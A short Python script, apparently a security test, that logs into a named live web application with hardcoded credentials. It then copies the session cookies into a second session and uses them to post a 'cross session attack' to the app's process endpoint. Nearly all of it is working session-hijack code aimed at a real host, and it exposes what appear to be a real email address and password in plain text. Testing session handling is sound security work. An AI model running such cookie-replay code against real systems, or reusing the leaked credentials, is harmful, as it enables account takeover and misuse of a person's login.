import uuid
import requests

def generate_uuid():
    return str(uuid.uuid4())
session1=requests.Session()
login_csrf_response=session1.get("https://smartfactory.bevywise.com/login")
login_csrf=login_csrf_response.cookies.get('csrftoken')
login_data={
    "username": "venkat7venkatesh77@gmail.com",
        "password": "@Venkystark77",
        "req_id": generate_uuid(),
        "csrfmiddlewaretoken": login_csrf
}
login_response=session1.post("https://smartfactory.bevywise.com/entry/login_check",data=login_data)
if login_response.ok:
    print("logged in successfully")
    print(session1)
cross_session=requests.Session()
cross_session.cookies.update(session1.cookies)
login_res=cross_session.get('https://smartfactory.bevywise.com/login')
response = cross_session.post('https://smartfactory.bevywise.com/process',data={"csrfmiddlewaretoken":cross_session.cookies.get('csrftoken'),"process_name":"cross_session_post2"},headers={'Referer':'https://smartfactory.bevywise.com'})
if response.ok:
    print("cross session attack posted successfully")
    print(cross_session)
else:
    print(response.status_code)
    print(response.text)
response=session1.post('https://smartfactory.bevywise.com/process',data={"csrfmiddlewaretoken":session1.cookies.get('csrftoken'),"process_name":"real_session_post"},headers={'Referer':'https://smartfactory.bevywise.com'})
if response.ok:
    print("original session post works")
    print("after")
    print(session1)
    print("original_session_cookies:",session1.cookies)
    print(cross_session)
    print("theif_session_cookies:",cross_session.cookies)
    print(session1==cross_session)
def get_session1():
    return session1